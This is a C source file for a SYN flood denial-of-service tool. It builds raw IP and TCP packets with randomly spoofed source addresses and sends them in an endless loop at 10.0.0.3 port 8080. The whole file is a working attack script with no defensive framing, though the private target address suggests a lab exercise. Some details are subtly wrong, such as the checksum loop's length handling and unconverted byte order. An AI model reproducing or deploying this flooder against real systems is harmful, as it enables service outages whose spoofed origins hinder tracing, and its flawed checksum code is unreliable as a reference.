#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>

#define DESTIP "10.0.0.3"
#define DESTPORT 8080
#define PACKET_LENGTH 4096


struct header
{
	struct tcphdr tcp_header;

	unsigned short length_tcp;			// length of pseudo + tcp header + data
    unsigned char placeholder;
    unsigned char proto;    
    unsigned int source;
    unsigned int dest;    
};


// Finds the checksum value that will be placed into the header
// Divide the content into 16-bit parts
unsigned short checksum(unsigned short *buffer, int numberOfBytes)
{
	unsigned long sumOfContents;
	unsigned short odd_byte;

	sumOfContents = 0;

	int i;
	for(i = numberOfBytes; i > 0; i--)
	{
		sumOfContents += *buffer;
		buffer++;
	}

	sumOfContents = (sumOfContents >> 16) + (sumOfContents & 0xffff);
	sumOfContents = sumOfContents + (sumOfContents >> 16);

	return (short)~sumOfContents;			// take 1s complement
}


// Fill the related fields of the IP header
void fillIPHeader(struct iphdr *ip_header)
{
	ip_header->ihl = 5;
	ip_header->version = 4;
	ip_header->tos = 0;
	ip_header->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	ip_header->protocol = IPPROTO_TCP;
	ip_header->check = 0;			// update after calculating checksum
	ip_header->id = htons(54321);	// id of the packet
	ip_header->frag_off = 0;
	ip_header->ttl = 255;
}


// Fill the related fields of the TCP header
void fillTCPHeader(struct tcphdr *tcp_header)
{
	tcp_header->source = htons(10003);
	tcp_header->dest = htons(8080);
	tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->window = htons(5840); 	// maximum allowed window size
    tcp_header->check = 0;				// will be updated with the checksum value
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->urg_ptr = 0;
}


int main()
{
	char buffer[PACKET_LENGTH];	

	int temp = 1;
    const int *temp_ptr = &temp;

	// creat IP header
	struct iphdr *ip_header;
	ip_header = (struct iphdr*)buffer;

	// create TCP header
	struct tcphdr *tcp_header;
	tcp_header = (struct tcphdr*)(sizeof(struct iphdr) + buffer);

	// Use raw sockets to be able to set TCP/IP headers manually
	int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	// seed for the random function (for sourceIPs)
	srand(time(0));

    // Set socket option to inform the kernel about filling headers explicitly    
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, temp_ptr, sizeof(temp));
    
    while (1)
    {
    	// fill the buffer with zeros
    	memset(buffer, 0, PACKET_LENGTH);

    	// store randomized sourceIPs at each turn
		char sourceIP[32];

		struct sockaddr_in sin;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(DESTPORT);
		sin.sin_addr.s_addr = inet_addr(DESTIP);			// convert destination IP address to binary in network byte order

		// Create random source IPs to send from
		snprintf(sourceIP, 16, "%lu.%lu.%lu.%lu", random() % 255, random() % 255, random() % 255, random() % 255);

		// fill IP header with related values and calculated checksum
		fillIPHeader(ip_header);
		ip_header->check = checksum((unsigned short*) buffer, ip_header->tot_len >> 1);
		ip_header->saddr = inet_addr(sourceIP);				// convert source IP address to binary in network byte order
		ip_header->daddr = sin.sin_addr.s_addr;

		// fill TCP header
		fillTCPHeader(tcp_header);

		// create pseudo header
		struct header hdr;

		hdr.source = inet_addr(sourceIP);					// convert source IP address to binary in network byte order
	    hdr.dest = sin.sin_addr.s_addr;
	    hdr.placeholder = 0;
	    hdr.proto = IPPROTO_TCP;
	    hdr.length_tcp = htons(20);
	    
	    memcpy(&hdr.tcp_header, tcp_header, sizeof(struct tcphdr));
	     
	    tcp_header->check = checksum((unsigned short*) &hdr, sizeof(struct header));

        // Send the packets
        int s = sendto(sock, buffer, ip_header->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
        if(s >= 0)
        {
            printf("Packet Send \n");
        }
    }
     
    return 0;

}
